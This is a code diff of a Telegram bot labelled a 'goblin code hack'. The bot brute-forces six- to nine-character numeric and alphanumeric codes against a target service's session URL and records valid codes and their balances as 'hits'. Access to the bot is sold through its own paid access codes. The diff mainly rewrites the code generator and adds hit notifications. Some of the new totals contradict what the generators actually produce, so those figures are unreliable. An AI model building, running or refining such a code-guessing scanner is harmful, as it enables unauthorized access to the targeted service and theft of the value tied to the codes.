@@ -41,10 +41,10 @@ conn.execute('PRAGMA journal_mode=WAL;')
 cursor = conn.cursor()
 db_lock = asyncio.Lock()
 
-cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)''')
+cursor.execute('CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)')
+cursor.execute('CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)')
+cursor.execute('CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)')
+cursor.execute('CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)')
 conn.commit()
 
 # ── OCR SETUP ─────────────────────────────────────────────────────────────
@@ -147,25 +147,28 @@ async def get_balance_info(session_id):
 
 def code_generator(mode):
     if mode == "6":
-        codes = [str(i).zfill(6) for i in range(1000000)]
+        for i in range(1000000):
+            yield str(i).zfill(6)
     elif mode == "7":
-        codes = [str(i).zfill(7) for i in range(10000000)]
+        for i in range(10000000):
+            yield str(i).zfill(7)
     elif mode == "8":
-        codes = [str(i).zfill(8) for i in range(100000000)]
+        for i in range(100000000):
+            yield str(i).zfill(8)
     elif mode == "9":
-        codes = [str(i).zfill(9) for i in range(1000000000)]
+        for i in range(1000000000):
+            yield str(i).zfill(9)
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
+        for code in itertools.product(chars, repeat=6):
+            yield ''.join(code)
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(3000000000000000)]
+        for code in itertools.product(chars, repeat=6):
+            yield ''.join(code)
     else:
-        codes = [str(i).zfill(6) for i in range(10000000000000000000)]
-
-    random.shuffle(codes)
-    for code in codes:
-        yield code
+        for i in range(1000000):
+            yield str(i).zfill(6)
 
 async def perform_check_silent(code, chat_obj, session_url, connector, context_data):
     if context_data.get('scan_stop', False): return None
@@ -210,7 +213,12 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
                                 async with db_lock:
                                     cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
                                     conn.commit()
-                            
+
+                                short_msg = f"🎉 `{code}` | {balance_display}"
+                                try:
+                                    await chat_obj.send_message(short_msg, parse_mode="Markdown")
+                                except:
+                                    pass
                             return True
                     context_data['expired'] += 1; return None
         except:
@@ -255,7 +263,6 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             await asyncio.sleep(0.01)
             if context.user_data.get('scan_stop', False): break
 
-            # Telegram Rate Limit မမိစေရန် ၁ စက္ကန့်မှ တစ်ကြိမ်သာ edit_text လုပ်မည်
             current_time = time.time()
             if current_time - last_edit_time < 1.0:
                 continue
@@ -276,12 +283,13 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             recent_hits = context.user_data.get('success_codes', [])[:25]
             hits_text = ""
             if recent_hits:
-                hits_text = "\n💯 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}, ⏰ : 1 hr 0 min" for h in recent_hits])
+                hits_text = "\n🔥 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}, ⏰ : 1 hr 0 min" for h in recent_hits])
 
             text = (
                 f"𝐠𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
                 f"{session_url}\n"
                 f" **Scanner Running** \n"
+                f"\n\n"
                 f" Tried: {checked_total:,}\n"
                 f" Current Code: {current_code}\n"
                 f" Hits: {hits}\n"
@@ -308,8 +316,6 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
         except:
             pass
-
-# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -552,12 +558,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elif mode == "7": total_codes_count = 10000000
         elif mode == "8": total_codes_count = 100000000
         elif mode == "9": total_codes_count = 1000000000
-        elif mode in ["alpha6", "mix6"]: total_codes_count = 30000000000
-        else: total_codes_count = 1000000000
+        elif mode in ["alpha6", "mix6"]: total_codes_count = 300000
+        else: total_codes_count = 1000000
 
         asyncio.create_task(run_scanner_background(query, session_url, mode, total_codes_count, context))
 
-# ── MAIN FUNCTION ─────────────────────────────────────────────────────────
 def main():
     app = Application.builder().token(TOKEN).build()
 
